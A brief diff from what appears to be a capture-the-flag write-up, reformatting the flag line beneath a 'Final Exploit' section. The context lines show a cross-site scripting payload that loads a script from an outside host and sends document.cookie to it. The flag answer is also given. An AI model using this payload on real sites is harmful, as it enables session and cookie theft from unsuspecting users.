@@ -30,4 +30,4 @@ Final Exploit:
 ><img src="" onerror="a=document.createElement('script'),a.setAttribute('src','https://example.com/x.js?cookie='+document.cookie),document.body.appendChild(a)" />
 ```
 
-Flag: flag{54n1t1z4t10n_k1nd4_h4rd}
+Flag: `flag{54n1t1z4t10n_k1nd4_h4rd}`
